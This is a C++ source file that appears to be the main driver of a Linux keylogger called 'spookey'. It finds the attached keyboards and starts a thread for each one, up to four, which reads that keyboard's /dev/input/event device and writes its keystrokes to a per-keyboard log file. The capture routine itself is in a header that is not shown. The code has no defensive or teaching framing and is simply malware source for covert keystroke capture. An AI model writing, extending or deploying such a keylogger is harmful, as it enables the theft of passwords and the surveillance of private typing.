#include <string>
#include <vector>
#include <iostream>
#include <cstdlib>
#include <pthread.h>

#include "spookey.hh"


#define MAX_THREADS 4


int main()
{
    int i, rc;
    std::string kbdName, keyboard, logFile;
    int numThreads = MAX_THREADS;

    std::vector<std::string> keyboards = getKeyboards();

    /* Number of threads depends on number of keyboards found
     * Will not exceed MAX_THREADS */
    if (keyboards.size() < numThreads) numThreads = keyboards.size();

    // Initialize thread pool and vector of ThreadData instances
    pthread_t threadPool[numThreads];
    std::vector<ThreadData> threadParams(numThreads, ThreadData());

    // Add data to ThreadData instances and start threads
    for (i=0; i < numThreads; ++i) {
        kbdName = keyboards[i];
        threadParams[i].logFile = kbdName + ".log";
        threadParams[i].keyboard = DEV_INPUT_EVENT + kbdName;
        rc = pthread_create(&threadPool[i], 0, captureToLog, (void *)&threadParams[i]);
    }

    // Wait for all threads to finish
    for (i=0; i < numThreads; ++i) {
        pthread_join(threadPool[i], NULL);
    }

    pthread_exit(NULL);

    return 0;
}
